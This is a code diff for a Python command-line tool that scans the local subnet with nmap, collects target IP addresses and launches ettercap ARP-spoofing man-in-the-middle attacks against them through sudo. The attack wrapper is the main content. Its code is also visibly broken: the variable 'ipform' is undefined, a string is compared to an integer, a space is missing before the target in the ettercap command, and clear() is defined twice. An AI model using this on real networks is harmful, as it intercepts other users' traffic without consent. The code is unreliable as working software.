@@ -25,27 +25,53 @@ def main():
             print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent SSID:", f"\u001b[33;1m{current_ssid}") 
             print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent inet:", f"\u001b[33;1m{current_addr}")
             
-        def scan():
-            current_addr  = os.popen("ip route get 1.2.3.4 | awk '{print $7}'").read()
-            scanout = os.system(f"nmap {current_addr}+'/24'")
-            print(" "+scanout)
+        def clear():
+            os.system("clear")                  
 
+        def scan():
+            addr = os.popen("ip route show | grep -i -m1 'default via' | awk '{print $3}'").read()
+            addr = addr.replace("\n","")
+            out = os.popen("nmap " + addr + "/24 -n -sP | grep -i 'Nmap scan report' | awk '{print $5}'").read()
+            print(" " "\u001b[35;1m[➔ Scan]: " "\u001b[0mScanned IP Addresses:", " " "\n" f" \u001b[33;1m{out}")
+        
         def target():
-            with open('src/target.txt', 'w') as targetf:
-                targetip = input("\n" " " "\u001b[34;1mEnter the target IP address: ")
-                targetf.write(targetip)
+            with open('src/target.txt', 'a') as targetf:
+                targetnum = int(input("\n" " " "\u001b[34;1mEnter the number of targets: "))
+                for n in range(targetnum):
+                    targetip = input("\n" " " "\u001b[34;1mEnter the target IP address: ")
+                    targetf.write("/"+targetip+"//"+"\n")
+            print(" " "\n" " \u001b[35;1m[➔ Info]:" " \u001b[0mTarget IP has been set")
+
+            
+        def clear():
+            os.system("clear")                  
             
         def htspoof():
-            return "ht"
+            if os.path.getsize('src/target.txt') == 0:
+                print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mYou have to set your target IP first!")
+            else:
+                target = os.popen("cat src/target.txt").read()
+                with open('src/target.txt', 'r') as targetf:
+                    print(" " "\u001b[35;1m[➔ Info]: " "Running ARP Spoofing...")
+                    time.sleep(0.5)
+                    ettercommand = ("sudo ettercap -Tq -M ARP")
+                    for ip in targetf.readlines():
+                        print(ettercommand+ip)
+                        if ip == 1:
+                            sp.Popen(f"sudo ettercap -Tq -M ARP /{ip}//")
+                        else:
+                            sp.Popen(ettercommand+ipform)
+                            print(ettercommand+ipform)
+
+                    targetf.truncate(0)
+ 
         def log():
             return "log"
 
-        def shell():
- 
-            def commands():
-                helpstr = '''\n\n Available Commands:           
+        def commands():
+            helpstr = '''\n\n Available Commands:           
                             
-                            \u001b[33;1mhelp - Displays this help page
+                            \u001b[33;1mcommands - Displays this help page
 
                             \u001b[33;1mscan - Scans the current network for all devices
 
@@ -56,9 +82,13 @@ def main():
                             \u001b[33;1mlog - View the active log of current network
                            
                            '''
-                print(helpstr)  
+            print(helpstr)  
 
-            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"log":log,"commands":commands}
+
+
+        def shell():
+ 
+            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"log":log,"commands":commands,"clear":clear}
 
             info_splash()
 
